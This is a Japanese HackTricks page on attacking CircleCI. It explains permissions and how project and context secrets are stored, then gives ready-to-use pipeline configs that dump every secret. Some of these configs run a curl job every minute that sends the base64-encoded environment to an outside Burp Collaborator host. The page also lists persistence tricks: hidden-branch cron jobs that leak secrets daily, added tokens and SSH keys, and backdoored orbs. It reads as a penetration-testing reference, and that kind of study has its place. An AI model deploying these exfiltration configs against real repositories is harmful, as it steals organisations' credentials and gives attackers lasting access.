# CircleCI セキュリティ

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
* **ハッキングテクニックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

## 基本情報

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) は、**テンプレートを定義**して何を行い、いつ行うかを示すことができる**継続的インテグレーションプラットフォーム**です。これにより、**リポジトリのマスターブランチから直接** **テスト**や**デプロイメントを自動化**できます。

## 権限

**CircleCI** は、ログインした**アカウント**に関連する**github**および**bitbucket**の権限を**継承**します。\
私のテストでは、**githubのリポジトリに書き込み権限がある限り**、**CircleCIでそのプロジェクトの設定を管理**できることを確認しました（新しいsshキーを設定したり、プロジェクトのAPIキーを取得したり、新しいCircleCI構成を持つ新しいブランチを作成したり...）。

ただし、**リポジトリの管理者**である必要があります**リポジトリをCircleCIプロジェクトに変換**するために。

## 環境変数とシークレット

[**ドキュメント**](https://circleci.com/docs/2.0/env-vars/)によると、ワークフロー内で**環境変数に値をロード**するための異なる方法があります。

### 組み込み環境変数

CircleCIによって実行されるすべてのコンテナには、常に[**ドキュメントで定義された特定の環境変数**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)が含まれます。例: `CIRCLE_PR_USERNAME`、`CIRCLE_PROJECT_REPONAME`、`CIRCLE_USERNAME`。

### 平文

**コマンド**内で平文で宣言することができます。
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**run environment** 内で明確なテキストで宣言することができます。
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job environment** 内で明確なテキストで宣言することができます。
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**コンテナの環境**内で明確なテキストで宣言することができます。
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### プロジェクトの秘密

これらはプロジェクトによってのみアクセス可能な**秘密**です（どのブランチでも）。\
これらは_https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_で宣言されているのを見ることができます。

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**Import Variables**"機能を使用すると、他のプロジェクトからこのプロジェクトに変数を**インポート**できます。
{% endhint %}

### コンテキストの秘密

これらは**組織全体**で共有される秘密です。**デフォルトでは、どのリポジトリでも**ここに保存された秘密にアクセスできます。

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
ただし、すべてのメンバーの代わりに異なるグループを**選択して、特定の人にのみ秘密へのアクセスを許可**することができます。\
これは現在、秘密のセキュリティを**向上させる最良の方法**の1つであり、誰もがアクセスできるのではなく、一部の人だけがアクセスできるようにします。
{% endhint %}

## 攻撃

### 明文テキストの秘密を検索

VCS（たとえばgithub）に**アクセス権**がある場合、各リポジトリの各ブランチの`.circleci/config.yml`ファイルをチェックし、そこに保存されている潜在的な**明文テキストの秘密**を**検索**します。

### Secret Env Vars & コンテキストの列挙

コードをチェックすると、各`.circleci/config.yml`ファイルで使用されている**すべての秘密の名前**を見つけることができます。また、これらのファイルから**コンテキストの名前**を取得するか、Webコンソールで確認できます：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### プロジェクトの秘密を外部流出

{% hint style="warning" %}
プロジェクトとコンテキストの**すべての秘密**を**外部流出**するには、github組織全体の**1つのリポジトリ**に**書き込みアクセス**が必要です（_そしてあなたのアカウントはデフォルトですべてのコンテキストにアクセスできます_）。
{% endhint %}

{% hint style="danger" %}
"**Import Variables**"機能を使用すると、他のプロジェクトからこのプロジェクトに変数を**インポート**できます。したがって、攻撃者は**すべてのリポジトリからすべてのプロジェクト変数をインポート**し、それらを**一緒に外部流出**することができます。
{% endhint %}

すべてのプロジェクトの秘密は常にジョブの環境に設定されているため、envを呼び出してそれをbase64で難読化するだけで、秘密が**ワークフローのWebログコンソール**に外部流出されます：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
もしWebコンソールにアクセスできないが、リポジトリにアクセスでき、CircleCIが使用されていることを知っている場合は、単に**1分ごとにトリガーされるワークフロー**を**作成**して、**シークレットを外部アドレスに漏洩**させることができます。
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### コンテキストのシークレットを流出させる

**コンテキスト名を指定する必要があります**（これによりプロジェクトのシークレットも流出します）:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
もしWebコンソールにアクセスできないが、リポジトリにアクセスでき、CircleCIが使用されていることを知っている場合、**1分ごとにトリガーされるワークフローを変更**して、**シークレットを外部アドレスに漏洩**させることができます。
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
新しい`.circleci/config.yml`をリポジトリに作成するだけでは、**CircleCIのビルドをトリガーするには十分ではありません**。**CircleCIコンソールでプロジェクトとして有効にする必要があります**。
{% endhint %}

### クラウドへの脱出

**CircleCI** は、**ビルドを彼らのマシンで実行するか、独自のマシンで実行するかのオプション**を提供します。\
デフォルトでは、彼らのマシンはGCPにあり、最初は関連する情報を見つけることはできません。ただし、被害者が**独自のマシン（おそらくクラウド環境で）でタスクを実行している場合**、**興味深い情報が含まれているクラウドメタデータエンドポイント**を見つけることができるかもしれません。

前の例ではすべてがDockerコンテナ内で起動されましたが、**VMマシンを起動するように依頼することもできます**（異なるクラウド権限を持つ場合があります）:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
または、リモートDockerサービスへのアクセス権を持つDockerコンテナーです：
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 永続性

* **CircleCIでユーザートークンを作成**して、ユーザーアクセスでAPIエンドポイントにアクセスすることが可能です。
* _https://app.circleci.com/settings/user/tokens_
* プロジェクトトークンを作成して、トークンに与えられた権限でプロジェクトにアクセスすることが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* プロジェクトにSSHキーを追加することが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 予期せぬプロジェクトで**隠しブランチにクーロンジョブを作成**し、毎日すべての**コンテキスト環境変数を漏洩**させることが可能です。
* または、コンテキストと**プロジェクトのシークレットを毎日漏洩**させる既知のジョブをブランチに作成/変更することも可能です。
* GitHubの所有者であれば、**未検証のorbを許可**し、ジョブで**バックドア**として構成することが可能です。
* 特定のタスクで**コマンドインジェクションの脆弱性**を見つけ、**シークレット**の値を変更してコマンドを**インジェクト**することが可能です。
